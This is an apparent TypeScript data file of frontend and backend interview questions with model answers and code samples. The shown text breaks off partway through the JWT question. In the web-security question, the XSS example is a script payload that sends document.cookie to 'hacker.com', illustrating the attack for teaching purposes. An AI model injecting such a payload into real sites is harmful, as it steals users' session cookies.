import { Question } from '@/types';

// Exporting full Question objects for Frontend and Backend to be used in questionPool.ts

export const frontendQuestions: Question[] = [
  {
    id: 'fe-1',
    title: 'CSS Box Model',
    difficulty: 'Easy',
    description: 'Explain the CSS Box Model and the difference between content-box and border-box.',
    approach: 'Explain the 4 layers (content, padding, border, margin) and how box-sizing affects total width/height calculations.',
    justification: 'Fundamental CSS concept necessary for any layout work.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['CSS', 'Layout', 'Fundamentals'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'The CSS Box Model is a box that wraps around every HTML element. It consists of: Margins (outermost), Borders, Padding, and the actual Content. The `box-sizing` property controls how total width and height are calculated.',
      keyPoints: [
        '`content-box` (default): width/height only apply to the content area. Total width = width + padding + border.',
        '`border-box`: width/height apply to all parts of the element (content, padding, border). Total width = width. (Padding and borders shrink the inner content area).'
      ],
      example: '```css\\n* { box-sizing: border-box; } /* standard reset */\\n.box { width: 200px; padding: 20px; border: 5px solid black; }\\n/* In border-box, the box is exactly 200px wide. */\\n```',
      followUps: ['What happens to margins in border-box?', 'Explain margin collapsing.']
    }
  },
  {
    id: 'fe-2',
    title: 'Debounce implementation',
    difficulty: 'Medium',
    description: 'Implement a debounce function in JavaScript that limits the rate at which a function can fire.',
    approach: 'Use a closure to hold a timer ID. When called, clear the existing timer and set a new one using setTimeout.',
    justification: 'Commonly used in search bars, window resizing, or scroll events to improve performance.',
    timeComplexity: 'O(1)',
    spaceComplexity: 'O(1) extra space',
    tags: ['JavaScript', 'Performance', 'Closures'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'coding',
    domainSolution: {
      language: 'javascript',
      languageLabel: 'JavaScript',
      code: `function debounce(func, wait) {
  let timeoutId;
  return function(...args) {
    const context = this;
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      func.apply(context, args);
    }, wait);
  };
}`
    }
  },
  {
    id: 'fe-3',
    title: 'Virtual DOM vs Real DOM',
    difficulty: 'Medium',
    description: 'Explain the concept of the Virtual DOM. How does it compare to the Real DOM, and why does React use it?',
    approach: 'Discuss the performance costs of direct DOM manipulation and how the Virtual DOM acts as a lightweight blueprint.',
    justification: 'Crucial for understanding how modern frameworks like React optimize rendering.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['React', 'Architecture', 'DOM'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'The Real DOM is an object-oriented representation of the web page. Updating it is slow because it causes browser reflows and repaints. The Virtual DOM is a lightweight JavaScript representation of the Real DOM.',
      keyPoints: [
        'React keeps a copy of the UI in the Virtual DOM.',
        'When state changes, React creates a new Virtual DOM tree.',
        'Diffing: React compares the new tree with the old one (Reconciliation).',
        'Patching: Only the specific changed nodes are updated in the Real DOM, minimizing expensive operations.'
      ],
      example: 'Imagine redrawing an entire house because one window broke (Real DOM) vs calculating exactly which window broke and replacing just the glass (Virtual DOM + diffing).',
      followUps: ['How does React diffing algorithm (Reconciliation) work?', 'What is the role of the `key` prop in React lists?']
    }
  },
  {
    id: 'fe-4',
    title: 'Event loop and Microtasks',
    difficulty: 'Hard',
    description: 'Explain the JavaScript Event Loop, Call Stack, Task Queue, and Microtask Queue. In what order are they processed?',
    approach: 'Define each component. Emphasize that Microtasks (Promises) always run before the next Macrotask (setTimeout).',
    justification: 'Fundamental to understanding JavaScript\'s asynchronous, non-blocking nature.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['JavaScript', 'Async', 'Event Loop'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'JavaScript is single-threaded. The Event Loop continuously checks if the Call Stack is empty. If it is, it pushes the first task from the queues to the stack.',
      keyPoints: [
        'Call Stack: Where synchronous code executes.',
        'Web APIs: Handle async operations (setTimeout, fetch) in the background.',
        'Microtask Queue: High priority. Holds Promise callbacks (`.then()`), `MutationObserver`.',
        'Macrotask Queue (Task Queue): Lower priority. Holds `setTimeout`, `setInterval`, DOM events.',
        'Order: Execute script -> Empty Call Stack -> Empty Microtask Queue COMPLETELY -> Pick ONE Macrotask -> Repeat.'
      ],
      example: 'console.log("1"); \\nsetTimeout(() => console.log("2"), 0); \\nPromise.resolve().then(() => console.log("3")); \\n// Output: 1, 3, 2',
      followUps: ['What happens if a microtask schedules another microtask? (It can block the event loop indefinitely).']
    }
  },
  {
    id: 'fe-5',
    title: 'React Hooks lifecycle',
    difficulty: 'Medium',
    description: 'Explain the lifecycle of a functional component using React Hooks (useEffect).',
    approach: 'Map class lifecycle methods (componentDidMount, componentDidUpdate, componentWillUnmount) to the dependency array in useEffect.',
    justification: 'Hooks are the modern standard for writing React components.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['React', 'Hooks', 'Lifecycle'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'coding',
    domainSolution: {
      language: 'javascript',
      languageLabel: 'JavaScript / React',
      code: `import React, { useEffect, useState } from 'react';

function LifecycleDemo() {
  const [count, setCount] = useState(0);

  // 1. ComponentDidMount (Empty dependency array)
  useEffect(() => {
    console.log('Mounted (runs once)');
    
    // 3. ComponentWillUnmount (Cleanup function)
    return () => {
      console.log('Unmounted (cleanup runs on unmount)');
    };
  }, []); 

  // 2. ComponentDidUpdate (Variables in dependency array)
  useEffect(() => {
    console.log(\`Count changed to \${count}\`);
    
    // Cleanup runs BEFORE the next effect execution
    return () => console.log(\`Cleanup for count \${count}\`);
  }, [count]);

  return <button onClick={() => setCount(c => c + 1)}>Increment</button>;
}`
    }
  },
  {
    id: 'fe-6',
    title: 'CSS Grid vs Flexbox',
    difficulty: 'Easy',
    description: 'When would you use CSS Grid versus CSS Flexbox? What are their core differences?',
    approach: 'Contrast 1D layouts (Flexbox) with 2D layouts (Grid). Discuss content-first vs layout-first approaches.',
    justification: 'Crucial for modern responsive web design.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['CSS', 'Layout', 'Grid', 'Flexbox'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'Flexbox and Grid are modern CSS layout systems but solve different problems.',
      keyPoints: [
        'Flexbox is One-Dimensional: Designed for laying out items in a single row OR a single column.',
        'Flexbox is Content-Out: Elements determine their size and wrap based on their content and flex rules.',
        'Grid is Two-Dimensional: Designed for laying out items in BOTH rows and columns simultaneously.',
        'Grid is Layout-In: You define a strict grid structure, and items fit into the defined cells/areas.'
      ],
      example: 'Use Flexbox for a navigation bar, a row of tags, or aligning items in a card. Use Grid for a whole page layout (Header, Sidebar, Main, Footer) or a complex photo gallery.',
      followUps: ['Can you use Grid and Flexbox together? (Yes, and you should!)']
    }
  },
  {
    id: 'fe-7',
    title: 'Promise.all implementation',
    difficulty: 'Hard',
    description: 'Implement your own version of Promise.all() from scratch.',
    approach: 'Return a new Promise. Iterate through inputs, attaching .then() to resolve them. Keep a counter of resolved promises and return the results array when count matches input length. Reject immediately on first failure.',
    justification: 'Tests deep understanding of Promises, closures, and async flow control.',
    timeComplexity: 'O(N) where N is number of promises',
    spaceComplexity: 'O(N) for results array',
    tags: ['JavaScript', 'Async', 'Promises'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'coding',
    domainSolution: {
      language: 'javascript',
      languageLabel: 'JavaScript',
      code: `function promiseAll(promises) {
  return new Promise((resolve, reject) => {
    if (!Array.isArray(promises)) {
      return reject(new TypeError('Argument must be an array'));
    }
    
    let resolvedCount = 0;
    const results = new Array(promises.length);
    
    if (promises.length === 0) {
      return resolve(results);
    }
    
    promises.forEach((promise, index) => {
      Promise.resolve(promise)
        .then(value => {
          results[index] = value;
          resolvedCount++;
          if (resolvedCount === promises.length) {
            resolve(results);
          }
        })
        .catch(error => {
          reject(error); // Reject immediately on first failure
        });
    });
  });
}`
    }
  },
  {
    id: 'fe-8',
    title: 'Web accessibility (a11y) basics',
    difficulty: 'Medium',
    description: 'What is web accessibility, and what are some core practices to ensure a web application is accessible?',
    approach: 'Discuss semantic HTML, ARIA labels, color contrast, and keyboard navigation.',
    justification: 'Legally required for many businesses and essential for inclusive design.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['HTML', 'Accessibility', 'a11y'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'Web accessibility (a11y) ensures that websites are usable by people with disabilities (visual, auditory, motor, cognitive).',
      keyPoints: [
        'Semantic HTML: Use `<button>` instead of `<div onClick>`, `<nav>`, `<header>`, `<main>` for screen readers.',
        'Keyboard Navigation: Ensure all interactive elements are reachable via `Tab` and usable via `Enter`/`Space`. Check focus outlines.',
        'Alt Text: Provide meaningful `alt` attributes for images, or empty `alt=""` for purely decorative ones.',
        'ARIA (Accessible Rich Internet Applications): Use ARIA attributes (`aria-label`, `aria-hidden`, `aria-expanded`) only when semantic HTML isn\'t enough.',
        'Contrast & Scaling: Ensure text contrast ratios meet WCAG guidelines and allow page zooming without breaking layout.'
      ],
      example: 'Instead of `<div class="btn" onclick="submit()">Submit</div>`, always use `<button type="submit">Submit</button>`.',
      followUps: ['How do you test accessibility? (Lighthouse, axe-core, VoiceOver, NVDA).']
    }
  },
  {
    id: 'fe-9',
    title: 'Frontend performance optimization',
    difficulty: 'Hard',
    description: 'What strategies would you use to optimize the load time and runtime performance of a large React application?',
    approach: 'Cover network optimizations (code splitting, lazy loading, CDNs, caching) and runtime optimizations (useMemo, useCallback, virtualization).',
    justification: 'Performance is critical for user retention and SEO (Core Web Vitals).',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['Performance', 'React', 'Network'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'Optimization happens in two phases: Load-time (getting bytes to the screen quickly) and Run-time (keeping interactions smooth at 60fps).',
      keyPoints: [
        'Load-time: Code Splitting (React.lazy) to reduce initial bundle size.',
        'Load-time: Image optimization (WebP, responsive sizes, lazy loading).',
        'Load-time: Caching (Service Workers, CDN, long max-age for static assets).',
        'Run-time: Virtualization/Windowing (react-window) for long lists.',
        'Run-time: Prevent unnecessary re-renders using `React.memo`, `useMemo`, and `useCallback` strategically.',
        'Run-time: Debouncing/Throttling heavy event listeners (scroll, resize).'
      ],
      example: 'For a dashboard, lazy load the heavy chart libraries so the main skeleton UI renders instantly, then fetch the charts.',
      followUps: ['What are Core Web Vitals? (LCP, FID/INP, CLS).']
    }
  },
  {
    id: 'fe-10',
    title: 'Deep clone implementation',
    difficulty: 'Medium',
    description: 'Implement a deep clone function in JavaScript that handles objects, arrays, and basic primitives.',
    approach: 'Use recursion. Check for null and types. Create a new array or object and recursively clone all properties. (Note: ignoring circular references for simplicity).',
    justification: 'Shows understanding of reference vs value types in JS and recursion.',
    timeComplexity: 'O(N) where N is total nodes in object tree',
    spaceComplexity: 'O(N) for recursion stack and new object creation',
    tags: ['JavaScript', 'Objects', 'Recursion'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'coding',
    domainSolution: {
      language: 'javascript',
      languageLabel: 'JavaScript',
      code: `function deepClone(obj) {
  // Handle null, undefined, primitives, and functions
  if (obj === null || typeof obj !== 'object') {
    return obj;
  }
  
  // Handle Dates
  if (obj instanceof Date) {
    return new Date(obj.getTime());
  }
  
  // Handle Arrays
  if (Array.isArray(obj)) {
    const cloneArr = [];
    for (let i = 0; i < obj.length; i++) {
      cloneArr[i] = deepClone(obj[i]);
    }
    return cloneArr;
  }
  
  // Handle Objects
  const cloneObj = {};
  for (const key in obj) {
    if (Object.prototype.hasOwnProperty.call(obj, key)) {
      cloneObj[key] = deepClone(obj[key]);
    }
  }
  
  return cloneObj;
}`
    }
  },
  {
    id: 'fe-11',
    title: 'State management in React',
    difficulty: 'Medium',
    description: 'Compare Context API with Redux. When would you choose one over the other?',
    approach: 'Discuss prop drilling, global vs local state, bundle size, and render performance (Context causes re-renders of all consumers on change).',
    justification: 'State architecture defines how a React app scales.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['React', 'State', 'Redux', 'Context'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'Both solve prop-drilling, but they are built for different scales of state management.',
      keyPoints: [
        'Context API: Built into React. Great for low-frequency updates like theme, localization, or auth state. Downsides: Any change to the context value forces a re-render of ALL consuming components, leading to performance issues if used for high-frequency state.',
        'Redux / Zustand: External libraries. Great for complex, high-frequency global state. They optimize renders using selectors, so components only re-render when the specific data they care about changes.',
        'Server State vs UI State: Modern apps often use React Query/SWR for server caching, heavily reducing the need for Redux.'
      ],
      example: 'Use Context for `isDarkMode`. Use Redux/Zustand for a complex shopping cart or active chat messages. Use React Query for fetching the user list.',
      followUps: ['How does React Query simplify state management?']
    }
  },
  {
    id: 'fe-12',
    title: 'Throttle implementation',
    difficulty: 'Medium',
    description: 'Implement a throttle function that ensures a given function is only called at most once in a specified time period.',
    approach: 'Track the last execution time. When called, check if `now - lastExecution >= limit`. If so, execute and update the last execution time.',
    justification: 'Common performance optimization for high-frequency events like scroll or mousemove.',
    timeComplexity: 'O(1)',
    spaceComplexity: 'O(1)',
    tags: ['JavaScript', 'Performance', 'Closures'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'coding',
    domainSolution: {
      language: 'javascript',
      languageLabel: 'JavaScript',
      code: `function throttle(func, limit) {
  let lastRan = 0;
  
  return function(...args) {
    const context = this;
    const now = Date.now();
    
    if (now - lastRan >= limit) {
      func.apply(context, args);
      lastRan = now;
    }
  };
}`
    }
  },
  {
    id: 'fe-13',
    title: 'Cross-Origin Resource Sharing (CORS)',
    difficulty: 'Medium',
    description: 'What is CORS, why does it exist, and how do you resolve CORS errors?',
    approach: 'Explain the Same-Origin Policy (security), preflight requests (OPTIONS), and how the server must configure headers to allow origins.',
    justification: 'The most common error encountered when connecting frontends to backends.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['Network', 'Security', 'Web'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'CORS is a browser security mechanism that restricts a web page from making requests to a different domain than the one that served the web page (Same-Origin Policy).',
      keyPoints: [
        'It protects users from malicious sites making API requests on their behalf using their cookies.',
        'It is enforced by the BROWSER, not the server. Postman works because it\'s not a browser.',
        'Preflight: For complex requests (PUT/DELETE/custom headers), the browser sends an OPTIONS request first to check if the server permits it.',
        'Fixing it: The BACKEND must include `Access-Control-Allow-Origin` headers specifying the frontend\'s exact domain (or `*`).'
      ],
      example: 'If your frontend is on `localhost:3000` and API on `localhost:8080`, they are different origins (different ports). The API must return `Access-Control-Allow-Origin: http://localhost:3000`.',
      followUps: ['Can you bypass CORS from the frontend? (Only via proxies).']
    }
  },
  {
    id: 'fe-14',
    title: 'React performance optimization',
    difficulty: 'Medium',
    description: 'Explain useMemo and useCallback. When should you use them, and when should you NOT use them?',
    approach: 'Discuss caching values vs caching functions, and the cost of memoization itself.',
    justification: 'Misuse of these hooks can actually make React apps slower.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['React', 'Hooks', 'Performance'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: '`useMemo` caches a calculated VALUE. `useCallback` caches a FUNCTION definition. They persist across renders unless dependencies change.',
      keyPoints: [
        'Use `useMemo` for expensive calculations (e.g., sorting a massive array, complex math).',
        'Use `useCallback` when passing a function as a prop to a deeply nested, memoized child component (wrapped in `React.memo`), to prevent the child from re-rendering just because the function reference changed.',
        'Do NOT use them everywhere. Memoization has a memory and CPU cost. Caching a simple array filtering of 10 items is slower than just letting it recalculate.',
        'Primitive props do not need useCallback.'
      ],
      example: '```javascript\\n// Good use case:\\nconst sortedBigData = useMemo(() => expensiveSort(data), [data]);\\nconst onChildClick = useCallback(() => setModalOpen(true), []);\\n```',
      followUps: ['What is `React.memo`?']
    }
  },
  {
    id: 'fe-15',
    title: 'Web security basics (XSS, CSRF)',
    difficulty: 'Hard',
    description: 'Explain XSS (Cross-Site Scripting) and CSRF (Cross-Site Request Forgery). How do you prevent them in a modern frontend?',
    approach: 'Define both attacks. For XSS, discuss input sanitization and React\'s default escaping. For CSRF, discuss anti-CSRF tokens and SameSite cookies.',
    justification: 'Frontend developers must understand how to protect users from common exploits.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['Security', 'XSS', 'CSRF'],
    company: 'Frontend',
    role: 'Frontend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'XSS involves injecting malicious scripts. CSRF involves forcing a logged-in user to execute unwanted actions.',
      keyPoints: [
        'XSS (Cross-Site Scripting): Attacker injects JS into the page (e.g., via a comment). If another user views the comment, the script runs in their browser and steals their token.',
        'Preventing XSS: Never trust user input. React automatically escapes strings, preventing XSS, UNLESS you use `dangerouslySetInnerHTML`. Always sanitize HTML on the backend.',
        'CSRF (Cross-Site Request Forgery): Attacker tricks a user into clicking a link that triggers an action on a site where they are currently authenticated (via cookies).',
        'Preventing CSRF: Use `SameSite=Strict` or `Lax` on cookies to prevent them from being sent cross-site. Alternatively, use JWTs in LocalStorage or CSRF tokens in headers.'
      ],
      example: 'XSS: A user name is `<script>fetch("hacker.com?cookie="+document.cookie)</script>`.',
      followUps: ['Why is Storing JWTs in LocalStorage vulnerable to XSS?']
    }
  }
];

export const backendQuestions: Question[] = [
  {
    id: 'be-1',
    title: 'Rate limiting (Token Bucket)',
    difficulty: 'Medium',
    description: 'Implement a Token Bucket rate limiter that allows a certain capacity of requests and refills at a constant rate.',
    approach: 'Use object-oriented programming. Track tokens and last refill timestamp. On each request, calculate elapsed time, add tokens (capped at capacity), and deduct one token if available.',
    justification: 'Standard algorithm for API rate limiting used by Stripe, AWS, etc.',
    timeComplexity: 'O(1) per request',
    spaceComplexity: 'O(1) state per user/IP',
    tags: ['System Design', 'Algorithms', 'API'],
    company: 'Backend',
    role: 'Backend',
    questionType: 'coding',
    domainSolution: {
      language: 'typescript',
      languageLabel: 'TypeScript / Node.js',
      code: `class TokenBucket {
  private capacity: number;
  private refillRatePerSec: number;
  private tokens: number;
  private lastRefillTime: number;

  constructor(capacity: number, refillRatePerSec: number) {
    this.capacity = capacity;
    this.refillRatePerSec = refillRatePerSec;
    this.tokens = capacity;
    this.lastRefillTime = Date.now();
  }

  private refill() {
    const now = Date.now();
    const elapsedTime = (now - this.lastRefillTime) / 1000;
    const tokensToAdd = elapsedTime * this.refillRatePerSec;
    
    this.tokens = Math.min(this.capacity, this.tokens + tokensToAdd);
    this.lastRefillTime = now;
  }

  public allowRequest(): boolean {
    this.refill();
    
    if (this.tokens >= 1) {
      this.tokens -= 1;
      return true;
    }
    return false;
  }
}`
    }
  },
  {
    id: 'be-2',
    title: 'ACID properties in Databases',
    difficulty: 'Easy',
    description: 'Explain the ACID properties of a relational database system.',
    approach: 'Define Atomicity, Consistency, Isolation, and Durability with real-world banking examples.',
    justification: 'Fundamental to understanding relational database guarantees and transactions.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['Database', 'SQL', 'Transactions'],
    company: 'Backend',
    role: 'Backend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'ACID is a set of properties that guarantee database transactions are processed reliably.',
      keyPoints: [
        'Atomicity: "All or nothing". A transaction must execute entirely or fail entirely. (e.g., in a bank transfer, money leaves account A AND enters account B, or neither happens).',
        'Consistency: A transaction takes the database from one valid state to another. Constraints (like foreign keys) are never violated.',
        'Isolation: Concurrent transactions execute sequentially without interfering with each other. Intermediate states are invisible.',
        'Durability: Once a transaction is committed, it remains saved even in the event of a power loss, crash, or error.'
      ],
      example: 'In PostgreSQL, wrapping queries in `BEGIN;` and `COMMIT;` ensures ACID compliance for that block of operations.',
      followUps: ['What are isolation levels? (Read Uncommitted, Read Committed, Repeatable Read, Serializable).']
    }
  },
  {
    id: 'be-3',
    title: 'CAP Theorem',
    difficulty: 'Medium',
    description: 'Explain the CAP Theorem and how it applies to modern distributed databases.',
    approach: 'Define Consistency, Availability, and Partition Tolerance. Explain why network partitions are inevitable, forcing a choice between C and A.',
    justification: 'Core system design concept for choosing the right database for a task.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['System Design', 'Distributed Systems'],
    company: 'Backend',
    role: 'Backend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'The CAP theorem states that a distributed data store can only simultaneously provide two out of three guarantees: Consistency, Availability, and Partition Tolerance.',
      keyPoints: [
        'Consistency (C): Every read receives the most recent write or an error.',
        'Availability (A): Every request receives a non-error response, without the guarantee that it contains the most recent write.',
        'Partition Tolerance (P): The system continues to operate despite an arbitrary number of messages being dropped by the network.',
        'The Reality: In distributed systems, network partitions (P) are unavoidable. Therefore, you must choose between CP (wait for sync, risk downtime) or AP (return immediately, risk stale data).'
      ],
      example: 'Cassandra is AP (highly available, eventual consistency). MongoDB can be configured as CP (Primary node handles writes consistently, if it goes down, writes stop until a new primary is elected).',
      followUps: ['What is Eventual Consistency?']
    }
  },
  {
    id: 'be-4',
    title: 'Consistent Hashing',
    difficulty: 'Hard',
    description: 'What is Consistent Hashing, and what problem does it solve in distributed systems?',
    approach: 'Explain the problem with modulo hashing when adding/removing servers. Describe the ring structure and virtual nodes.',
    justification: 'Crucial for understanding how load balancers and distributed caches (like Memcached/Redis cluster) work.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['System Design', 'Hashing', 'Load Balancing'],
    company: 'Backend',
    role: 'Backend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'Consistent Hashing is a technique used to distribute data across multiple servers in a way that minimizes data reorganization when servers are added or removed.',
      keyPoints: [
        'The Problem: Standard hashing (`hash(key) % N`) fails when N (number of servers) changes, requiring almost all keys to be remapped.',
        'The Ring: Consistent hashing maps both servers and data keys to a circle (usually 0 to 2^32-1).',
        'Placement: A key is placed on the first server encountered by moving clockwise around the ring.',
        'Adding/Removing: If a server fails, only its keys are reassigned to the next server. If a server is added, it only takes keys from its immediate clockwise neighbor.',
        'Virtual Nodes: To ensure balanced load, each real server is mapped to multiple "virtual nodes" scattered around the ring.'
      ],
      example: 'Used heavily in distributed caches (Memcached, Redis), CDNs (Akamai), and databases (Cassandra, DynamoDB).',
      followUps: ['How do virtual nodes solve the hot-spot problem?']
    }
  },
  {
    id: 'be-5',
    title: 'SQL vs NoSQL',
    difficulty: 'Easy',
    description: 'Compare SQL (Relational) and NoSQL (Non-Relational) databases. When should you use each?',
    approach: 'Compare structure, schemas, scalability, and relationships.',
    justification: 'Basic architectural decision for any backend project.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['Database', 'SQL', 'NoSQL'],
    company: 'Backend',
    role: 'Backend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'SQL and NoSQL represent different data storage paradigms tailored for different use cases.',
      keyPoints: [
        'SQL (PostgreSQL, MySQL): Tabular data, rigid schema, strong ACID transactions, complex JOIN queries. Scales vertically (bigger CPU/RAM).',
        'NoSQL (MongoDB, DynamoDB): Document, Key-Value, or Graph data. Flexible schema, eventual consistency (usually). Scales horizontally (adding more cheap servers).',
        'Use SQL for: Financial systems, ERPs, systems where data relationships and data integrity are paramount.',
        'Use NoSQL for: Rapid prototyping, massive scale, IoT time-series data, content management, where data structure changes often.'
      ],
      example: 'An e-commerce site might use SQL for orders and payments (ACID required), but NoSQL for the product catalog (flexible schema, high read throughput) and Redis for session caching.',
      followUps: ['Can NoSQL databases have relationships? (Yes, via referencing or embedding, but no JOINs).']
    }
  },
  {
    id: 'be-6',
    title: 'Caching strategies',
    difficulty: 'Medium',
    description: 'Explain Cache-Aside, Write-Through, and Write-Behind caching strategies.',
    approach: 'Define the flow of data between the app, cache, and database for each strategy.',
    justification: 'Caching is the most common way to scale backend read throughput.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['System Design', 'Caching', 'Performance'],
    company: 'Backend',
    role: 'Backend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'Caching strategies dictate how the application interacts with the cache (e.g., Redis) and the primary database to keep data in sync.',
      keyPoints: [
        'Cache-Aside (Lazy Loading): App requests data from cache. If miss, app fetches from DB, puts it in cache, and returns it. Good for read-heavy workloads. Risk of stale data.',
        'Write-Through: App writes data to the cache AND the database simultaneously. Pro: Data is always consistent. Con: Writes are slower (two operations).',
        'Write-Behind (Write-Back): App writes ONLY to the cache. Cache asynchronously writes to the database later. Pro: Extremely fast writes. Con: Risk of data loss if cache crashes before sync.'
      ],
      example: 'A user profile picture read heavily is best for Cache-Aside with a TTL (Time To Live). High-volume, non-critical logs are good for Write-Behind.',
      followUps: ['What are common cache eviction policies? (LRU, LFU, FIFO).']
    }
  },
  {
    id: 'be-7',
    title: 'Microservices vs Monolith',
    difficulty: 'Medium',
    description: 'What are the pros and cons of a Microservices architecture compared to a Monolithic architecture?',
    approach: 'Discuss deployment, scaling, fault tolerance, and organizational boundaries versus complexity, latency, and operational overhead.',
    justification: 'The classic architectural debate every backend engineer faces.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['Architecture', 'System Design'],
    company: 'Backend',
    role: 'Backend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'A monolith builds the entire application as a single deployable unit. Microservices split the application into small, independent services communicating over a network.',
      keyPoints: [
        'Monolith Pros: Simple to develop, deploy, and debug end-to-end. Fast in-memory function calls.',
        'Monolith Cons: Any bug can crash the whole app. Hard to scale specific components. Codebase becomes tangled over time.',
        'Microservices Pros: Independent deployment, language/tech flexibility per service, independent scaling (scale the image-processor, not the billing service).',
        'Microservices Cons: High operational complexity (Kubernetes, CI/CD). Network latency. Distributed tracing and debugging is very hard. Distributed transactions (Saga pattern) are complex.'
      ],
      example: 'Startups should usually start with a modular monolith. Only transition to microservices when organizational scale (multiple independent teams) or extreme technical scale demands it.',
      followUps: ['What is the Saga pattern?']
    }
  },
  {
    id: 'be-8',
    title: 'Database Indexing internals',
    difficulty: 'Hard',
    description: 'How do database indexes work internally? What data structures are commonly used?',
    approach: 'Explain B-Trees (B+ Trees). Discuss how they reduce time complexity from O(N) to O(log N). Mention the cost of indexes on write operations.',
    justification: 'Crucial for optimizing slow SQL queries.',
    timeComplexity: 'O(log N) for search',
    spaceComplexity: 'O(N) for index storage',
    tags: ['Database', 'SQL', 'Data Structures'],
    company: 'Backend',
    role: 'Backend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'An index is a separate data structure that stores a fraction of data in an ordered way to make lookups vastly faster, similar to an index at the back of a book.',
      keyPoints: [
        'B-Tree / B+ Tree: The default structure in almost all relational databases. It remains balanced, ensuring O(log N) time for search, insert, and delete.',
        'In a B+ Tree, all data pointers are stored only in the leaf nodes, which are linked together, making range queries (`WHERE age BETWEEN 20 AND 30`) extremely fast.',
        'Hash Index: Fast O(1) lookups for exact matches (`=`), but useless for range queries (`>`, `<`).',
        'Trade-offs: Indexes consume disk space. Every time a row is inserted, updated, or deleted, the index must also be updated, making WRITE operations slower.'
      ],
      example: 'Creating an index on an `email` column prevents the database from doing a Full Table Scan (checking every single row) during a login request.',
      followUps: ['What is a composite index and why does column order matter?']
    }
  },
  {
    id: 'be-9',
    title: 'Message Queues (Kafka/RabbitMQ)',
    difficulty: 'Medium',
    description: 'Why use a message broker like Kafka or RabbitMQ? Describe the Pub/Sub model.',
    approach: 'Discuss asynchronous processing, decoupling services, and peak load buffering (smoothing).',
    justification: 'Standard component in modern event-driven architectures.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['System Design', 'Architecture', 'Async'],
    company: 'Backend',
    role: 'Backend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'Message queues act as asynchronous buffers between services, allowing them to communicate without being directly connected or waiting for each other.',
      keyPoints: [
        'Decoupling: Service A generates an event. Service B, C, and D consume it. Service A doesn\'t need to know they exist.',
        'Buffering (Load Smoothing): If traffic spikes 10x, a synchronous API would crash. A queue absorbs the messages, and workers process them at their own safe pace.',
        'Pub/Sub (Publish/Subscribe): A publisher sends a message to a "Topic". Multiple subscribers listen to that topic. (e.g., "UserCreated" topic triggers welcome email, analytics, and CRM sync).',
        'RabbitMQ is a traditional queue (messages deleted when read). Kafka is a distributed log (messages persist, consumers track their own offsets).'
      ],
      example: 'When uploading a video to YouTube, the HTTP request returns immediately. The heavy processing (compression, format generation) is pushed to a queue and handled by background workers.',
      followUps: ['What is the difference between RabbitMQ (Smart Broker/Dumb Consumer) and Kafka (Dumb Broker/Smart Consumer)?']
    }
  },
  {
    id: 'be-10',
    title: 'JWT vs Session authentication',
    difficulty: 'Medium',
    description: 'Compare JWT (JSON Web Tokens) with traditional server-side Session authentication. What are the security implications?',
    approach: 'Stateful vs Stateless. Discuss where tokens/cookies are stored, and how revoking access works in both systems.',
    justification: 'Authentication is a requirement for 99% of web applications.',
    timeComplexity: 'N/A',
    spaceComplexity: 'N/A',
    tags: ['Security', 'Auth', 'API'],
    company: 'Backend',
    role: 'Backend',
    questionType: 'conceptual',
    conceptualAnswer: {
      explanation: 'Sessions are stateful (server remembers you). JWTs are stateless (the token itself proves who you are).',
      keyPoints: [
        'Session (Stateful): Client sends credentials. Server creates session in memory/Redis, returns a Session ID cookie. Client sends cookie on next request. Server looks it up.',
